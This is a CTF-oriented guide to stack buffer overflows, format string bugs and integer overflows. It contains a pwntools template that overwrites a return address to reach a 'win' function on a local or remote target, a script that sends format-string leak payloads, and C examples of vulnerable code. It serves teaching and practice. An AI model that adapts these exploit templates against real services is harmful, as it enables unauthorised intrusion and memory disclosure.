# Common Vulnerability Types

### 1. Stack Buffer Overflow

#### Identification
- Look for functions using `gets()`, `strcpy()`, `scanf()` without bounds
- Fixed-size buffers receiving user input
- Missing length validation

#### Exploitation Pattern
```python
# File: buffer_overflow_template.py
#!/usr/bin/env python3

from pwn import *

# Configuration
binary_path = "./vulnerable_binary"
host = "target.ctf.com"
port = 1337

# Set context for target architecture
context.arch = 'amd64'
context.log_level = 'info'

def exploit_local():
    """Exploit local binary"""
    p = process(binary_path)
    return exploit_common(p)

def exploit_remote():
    """Exploit remote service"""
    p = remote(host, port)
    return exploit_common(p)

def exploit_common(p):
    """Common exploitation logic"""
    # Wait for prompt
    p.recvuntil(b"Enter name: ")

    # Craft payload
    offset = 40  # Found through analysis
    target_function = 0x401234  # Address of win function

    payload = b'A' * offset
    payload += p64(target_function)

    # Send payload
    log.info("Sending payload...")
    p.sendline(payload)

    # Interact with shell/response
    p.interactive()

if __name__ == "__main__":
    # Uncomment appropriate line:
    exploit_local()
    # exploit_remote()
```

### 2. Format String Vulnerabilities

#### Identification
```c
// Vulnerable patterns:
printf(user_input);           // Direct user input to printf
fprintf(file, user_input);    // Same issue with fprintf
snprintf(buffer, size, user_input); // Can leak memory
```

#### Exploitation Basics
```python
# File: format_string_exploit.py
#!/usr/bin/env python3

from pwn import *

def test_format_string(binary_path):
    """Test for format string vulnerability"""
    p = process(binary_path)

    # Test payloads
    test_payloads = [
        b"%x" * 10,           # Leak stack values
        b"%p" * 5,            # Leak pointers
        b"%s",                # Potential crash
        b"AAAA" + b"%x" * 20, # Find position of input
    ]

    for payload in test_payloads:
        try:
            p = process(binary_path)
            p.sendline(payload)
            response = p.recv(timeout=2)
            print(f"Payload: {payload}")
            print(f"Response: {response}")
            print("-" * 40)
            p.close()
        except:
            print(f"Payload {payload} caused crash or timeout")

# Example usage
if __name__ == "__main__":
    test_format_string("./format_vuln_binary")
```

### 3. Integer Overflow

#### Identification
```c
// Look for patterns like:
int size;
scanf("%d", &size);
char* buffer = malloc(size);  // What if size < 0?

unsigned int length;
scanf("%u", &length);
if (length > MAX_SIZE) {      // What if length wraps around?
    return -1;
}
char buffer[length];
```
